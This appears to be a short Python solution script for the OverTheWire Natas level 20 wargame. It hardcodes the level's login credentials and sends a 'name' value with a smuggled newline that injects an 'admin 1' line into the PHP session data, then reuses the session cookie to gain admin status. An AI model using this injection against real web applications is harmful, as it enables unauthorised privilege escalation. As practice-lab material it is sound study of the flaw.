import requests, string

target = 'http://natas20.natas.labs.overthewire.org'
auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')
params = dict(name='admin\nadmin 1', debug='')
cookies = dict()

r = requests.get(target, auth=auth, params=params, cookies=cookies);
print (r.text + '\n\n\n')

cookies = dict(PHPSESSID = r.cookies['PHPSESSID'])
params = dict(debug='')

r = requests.get(target, auth=auth, params=params, cookies=cookies);
print(r.text)
